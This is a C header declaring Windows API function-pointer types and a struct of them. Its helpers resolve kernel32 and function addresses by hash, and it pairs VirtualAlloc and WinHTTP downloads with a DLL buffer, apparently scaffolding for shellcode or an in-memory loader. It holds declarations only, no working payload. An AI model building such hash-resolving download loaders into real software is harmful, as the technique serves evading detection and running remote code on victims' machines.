#pragma once
#include <windows.h>
#include <winhttp.h>

typedef FARPROC(WINAPI* FN_GetProcAddress)(
	_In_ HMODULE hModule,
	_In_ LPCSTR lpProcName
	);

typedef HMODULE(WINAPI* FN_LoadLibraryA)(
	_In_ LPCSTR lpLibFileName
	);

typedef int(WINAPI* FN_MessageBoxA)(
	_In_opt_ HWND hWnd,
	_In_opt_ LPCSTR lpText,
	_In_opt_ LPCSTR lpCaption,
	_In_ UINT uType);

typedef LPVOID(WINAPI* FN_VirtualAlloc)(
	_In_opt_ LPVOID lpAddress,
	_In_     SIZE_T dwSize,
	_In_     DWORD flAllocationType,
	_In_     DWORD flProtect);

typedef HINTERNET (WINAPI* FN_WinHttpOpen)
(
	_In_opt_z_ LPCWSTR pszAgentW,
	_In_ DWORD dwAccessType,
	_In_opt_z_ LPCWSTR pszProxyW,
	_In_opt_z_ LPCWSTR pszProxyBypassW,
	_In_ DWORD dwFlags
);

typedef HINTERNET (WINAPI* FN_WinHttpConnect)
(
	IN HINTERNET hSession,
	IN LPCWSTR pswzServerName,
	IN INTERNET_PORT nServerPort,
	IN DWORD dwReserved
);

typedef HINTERNET (WINAPI* FN_WinHttpOpenRequest)
(
	IN HINTERNET hConnect,
	IN LPCWSTR pwszVerb,
	IN LPCWSTR pwszObjectName,
	IN LPCWSTR pwszVersion,
	IN LPCWSTR pwszReferrer OPTIONAL,
	IN LPCWSTR FAR* ppwszAcceptTypes OPTIONAL,
	IN DWORD dwFlags
);


typedef BOOL (WINAPI* FN_WinHttpSendRequest)
(
	IN HINTERNET hRequest,
	_In_reads_opt_(dwHeadersLength) LPCWSTR lpszHeaders,
	IN DWORD dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID lpOptional,
	IN DWORD dwOptionalLength,
	IN DWORD dwTotalLength,
	IN DWORD_PTR dwContext
);

typedef BOOL (WINAPI* FN_WinHttpReceiveResponse)
(
	IN HINTERNET hRequest,
	IN LPVOID lpReserved
);


typedef BOOL(WINAPI* FN_WinHttpQueryHeaders)
(
	IN     HINTERNET hRequest,
	IN     DWORD     dwInfoLevel,
	IN     LPCWSTR   pwszName OPTIONAL,
	_Out_writes_bytes_to_opt_(*lpdwBufferLength, *lpdwBufferLength) __out_data_source(NETWORK) LPVOID lpBuffer,
	IN OUT LPDWORD   lpdwBufferLength,
	IN OUT LPDWORD   lpdwIndex OPTIONAL
);

typedef BOOL(WINAPI* FN_WinHttpReadData)
(
	IN HINTERNET hRequest,
	_Out_writes_bytes_to_(dwNumberOfBytesToRead, *lpdwNumberOfBytesRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	IN DWORD dwNumberOfBytesToRead,
	OUT LPDWORD lpdwNumberOfBytesRead
);

typedef BOOL(WINAPI* FN_WinHttpCloseHandle)
(
	IN HINTERNET hInternet
);

typedef struct tagApiInterface {
	FN_GetProcAddress pfnGetProcAddress;
	FN_LoadLibraryA pfnLoadLibrary;
	FN_MessageBoxA pfnMessageBoxA;
	FN_VirtualAlloc pfnVirtualAlloc;
	FN_WinHttpOpen pfnWinHttpOpen;
	FN_WinHttpConnect pfnWinHttpConnect;
	FN_WinHttpOpenRequest pfnWinHttpOpenRequest;
	FN_WinHttpSendRequest pfnWinHttpSendRequest;
	FN_WinHttpReceiveResponse pfnWinHttpReceiveResponse;
	FN_WinHttpQueryHeaders pfnWinHttpQueryHeaders;
	FN_WinHttpReadData pfnWinHttpReadData;
	FN_WinHttpCloseHandle pfnWinHttpCloseHandle;
	PVOID pDllBuffer;
}APIINTERFACE,*PAPIINTERFACE;

DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName);
//DWORD MyGetProcAddress(HMODULE hModule, LPCSTR lpProcName);
HMODULE GetKernel32Base();
BOOL MyStrcmp(DWORD str1, char* str2);
DWORD GetProcHash(char* lpProcName);